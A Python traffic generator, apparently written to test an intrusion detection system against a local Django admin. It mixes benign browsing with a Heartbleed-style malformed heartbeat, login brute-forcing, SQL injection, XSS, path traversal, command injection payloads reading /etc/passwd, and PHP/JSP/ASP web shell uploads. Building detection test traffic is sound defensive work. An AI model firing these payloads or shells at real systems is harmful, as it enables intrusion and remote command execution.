#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Traffic Generator
For generating various types of network traffic to test detection system
网络流量生成器 - 用于生成各种类型的网络流量来测试检测系统
"""

import socket
import threading
import time
import random
import requests
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
import json

class TrafficGenerator:
    def __init__(self, target_ip="127.0.0.1", target_port=8000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False

    def generate_benign_traffic(self, duration=60):
        """Generate normal traffic / 生成正常流量"""
        print(f"[Normal Traffic] Starting normal traffic generation for {duration} seconds")

        start_time = time.time()
        request_count = 0

        while (time.time() - start_time) < duration:
            try:
                # Simulate normal user behavior / 模拟正常用户行为
                actions = [
                    self._normal_web_browsing,
                    self._normal_api_calls,
                    self._normal_file_access,
                    self._normal_search_queries
                ]

                action = random.choice(actions)
                action()
                request_count += 1

                # Normal user access interval / 正常用户的访问间隔
                time.sleep(random.uniform(2, 8))

            except Exception as e:
                print(f"Normal traffic generation error: {e}")
                time.sleep(1)

        print(f"[Normal Traffic] Generation completed, sent {request_count} requests")

    def _normal_web_browsing(self):
        """Simulate normal web browsing / 模拟正常网页浏览"""
        pages = [
            "/",
            "/admin/",
            "/admin/main/",
            "/admin/main/trafficlog/",
            "/admin/main/ipaddressrule/",
        ]

        page = random.choice(pages)
        url = f"http://{self.target_ip}:{self.target_port}{page}"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

        response = requests.get(url, headers=headers, timeout=10)
        print(f"Normal browsing: {page} - {response.status_code}")

    def _normal_api_calls(self):
        """Simulate normal API calls / 模拟正常API调用"""
        # Simulate getting static resources / 模拟获取静态资源
        resources = [
            "/static/admin/css/base.css",
            "/static/admin/js/core.js",
            "/static/admin/img/icon-addlink.svg",
        ]
        
        resource = random.choice(resources)
        url = f"http://{self.target_ip}:{self.target_port}{resource}"
        
        response = requests.get(url, timeout=5)
        print(f"正常资源: {resource} - {response.status_code}")
    
    def _normal_file_access(self):
        """模拟正常文件访问"""
        # 模拟访问管理页面
        url = f"http://{self.target_ip}:{self.target_port}/admin/main/trafficlog/"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        print(f"正常文件访问: /admin/main/trafficlog/ - {response.status_code}")
    
    def _normal_search_queries(self):
        """模拟正常搜索查询"""
        # 模拟在管理界面进行搜索
        search_terms = ["traffic", "log", "admin", "user", "system"]
        term = random.choice(search_terms)
        
        url = f"http://{self.target_ip}:{self.target_port}/admin/main/trafficlog/?q={term}"
        
        response = requests.get(url, timeout=5)
        print(f"正常搜索: {term} - {response.status_code}")
    
    def generate_heartbleed_traffic(self, duration=30):
        """生成Heartbleed攻击流量"""
        print(f"[Heartbleed] 开始生成Heartbleed攻击流量，持续{duration}秒")
        
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            try:
                # 模拟Heartbleed攻击包
                # 构造异常的TLS心跳包
                heartbeat_payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'  # 异常心跳包
                
                # 发送到HTTPS端口（模拟）
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                try:
                    sock.connect((self.target_ip, 443))  # HTTPS端口
                    sock.send(heartbeat_payload)
                    sock.close()
                    print("Heartbleed攻击包已发送")
                except:
                    # 如果443端口不开放，发送到目标端口
                    try:
                        sock.connect((self.target_ip, self.target_port))
                        sock.send(heartbeat_payload)
                        sock.close()
                    except:
                        pass
                
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"Heartbleed攻击错误: {e}")
                time.sleep(1)
        
        print("[Heartbleed] 攻击流量生成完成")
    
    def generate_patator_traffic(self, duration=25):
        """生成Patator暴力破解流量"""
        print(f"[Patator] 开始生成暴力破解流量，持续{duration}秒")
        
        usernames = ["admin", "root", "user", "test", "guest", "administrator", "sa", "oracle"]
        passwords = ["123456", "password", "admin", "root", "test", "123", "qwerty", "abc123"]
        
        start_time = time.time()
        attempt_count = 0
        
        while (time.time() - start_time) < duration:
            try:
                username = random.choice(usernames)
                password = random.choice(passwords)
                
                # 模拟HTTP暴力破解
                login_data = {
                    'username': username,
                    'password': password,
                    'next': '/admin/'
                }
                
                headers = {
                    'User-Agent': 'Patator/0.7',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                
                response = requests.post(
                    f"http://{self.target_ip}:{self.target_port}/admin/login/",
                    data=login_data,
                    headers=headers,
                    timeout=5,
                    allow_redirects=False
                )
                
                attempt_count += 1
                print(f"Patator尝试 #{attempt_count}: {username}:{password} - {response.status_code}")
                
                # 快速尝试，模拟自动化工具
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Patator攻击错误: {e}")
                time.sleep(1)
        
        print(f"[Patator] 暴力破解完成，共尝试 {attempt_count} 次")
    
    def generate_infiltration_traffic(self, duration=20):
        """生成渗透攻击流量"""
        print(f"[Infiltration] 开始生成渗透攻击流量，持续{duration}秒")
        
        start_time = time.time()
        
        while (time.time() - start_time) < duration:
            try:
                # 模拟各种渗透技术
                techniques = [
                    self._sql_injection,
                    self._xss_attack,
                    self._path_traversal,
                    self._command_injection,
                    self._file_upload_attack
                ]
                
                technique = random.choice(techniques)
                technique()
                
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                print(f"渗透攻击错误: {e}")
                time.sleep(1)
        
        print("[Infiltration] 渗透攻击流量生成完成")
    
    def _sql_injection(self):
        """SQL注入攻击"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin' --",
            "' OR 1=1 --"
        ]
        
        payload = random.choice(payloads)
        url = f"http://{self.target_ip}:{self.target_port}/admin/main/trafficlog/?q={payload}"
        
        headers = {'User-Agent': 'sqlmap/1.4.7'}
        response = requests.get(url, headers=headers, timeout=5)
        print(f"SQL注入: {payload[:20]}... - {response.status_code}")
    
    def _xss_attack(self):
        """XSS攻击"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')"
        ]
        
        payload = random.choice(payloads)
        url = f"http://{self.target_ip}:{self.target_port}/admin/main/trafficlog/?q={payload}"
        
        response = requests.get(url, timeout=5)
        print(f"XSS攻击: {payload[:20]}... - {response.status_code}")
    
    def _path_traversal(self):
        """路径遍历攻击"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        payload = random.choice(payloads)
        url = f"http://{self.target_ip}:{self.target_port}/static/{payload}"
        
        response = requests.get(url, timeout=5)
        print(f"路径遍历: {payload[:20]}... - {response.status_code}")
    
    def _command_injection(self):
        """命令注入攻击"""
        payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; ping -c 1 127.0.0.1"
        ]
        
        payload = random.choice(payloads)
        data = {'cmd': payload}
        
        response = requests.post(
            f"http://{self.target_ip}:{self.target_port}/admin/",
            data=data,
            timeout=5
        )
        print(f"命令注入: {payload[:20]}... - {response.status_code}")
    
    def _file_upload_attack(self):
        """文件上传攻击"""
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('shell.asp', '<%eval request("cmd")%>', 'application/x-asp')
        ]
        
        filename, content, content_type = random.choice(malicious_files)
        files = {'file': (filename, content, content_type)}
        
        try:
            response = requests.post(
                f"http://{self.target_ip}:{self.target_port}/upload/",
                files=files,
                timeout=5
            )
            print(f"文件上传攻击: {filename} - {response.status_code}")
        except:
            print(f"文件上传攻击: {filename} - 连接失败")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='网络流量生成器')
    parser.add_argument('--target', default='127.0.0.1', help='目标IP地址')
    parser.add_argument('--port', type=int, default=8000, help='目标端口')
    parser.add_argument('--type', choices=['benign', 'heartbleed', 'patator', 'infiltration', 'all'], 
                       default='all', help='流量类型')
    parser.add_argument('--duration', type=int, default=60, help='生成时长（秒）')
    
    args = parser.parse_args()
    
    generator = TrafficGenerator(args.target, args.port)
    
    print("=" * 60)
    print("网络流量生成器启动")
    print(f"目标: {args.target}:{args.port}")
    print(f"类型: {args.type}")
    print(f"时长: {args.duration}秒")
    print("=" * 60)
    
    if args.type == 'benign':
        generator.generate_benign_traffic(args.duration)
    elif args.type == 'heartbleed':
        generator.generate_heartbleed_traffic(args.duration)
    elif args.type == 'patator':
        generator.generate_patator_traffic(args.duration)
    elif args.type == 'infiltration':
        generator.generate_infiltration_traffic(args.duration)
    elif args.type == 'all':
        # 并行生成多种流量
        threads = []
        
        # 正常流量（持续运行）
        t1 = threading.Thread(target=generator.generate_benign_traffic, args=(args.duration,))
        threads.append(t1)
        
        # 各种攻击流量
        t2 = threading.Thread(target=generator.generate_heartbleed_traffic, args=(20,))
        t3 = threading.Thread(target=generator.generate_patator_traffic, args=(25,))
        t4 = threading.Thread(target=generator.generate_infiltration_traffic, args=(30,))
        
        threads.extend([t2, t3, t4])
        
        # 启动所有线程
        for t in threads:
            t.start()
            time.sleep(2)  # 错开启动时间
        
        # 等待所有线程完成
        for t in threads:
            t.join()
    
    print("\n流量生成完成！")

if __name__ == "__main__":
    main()
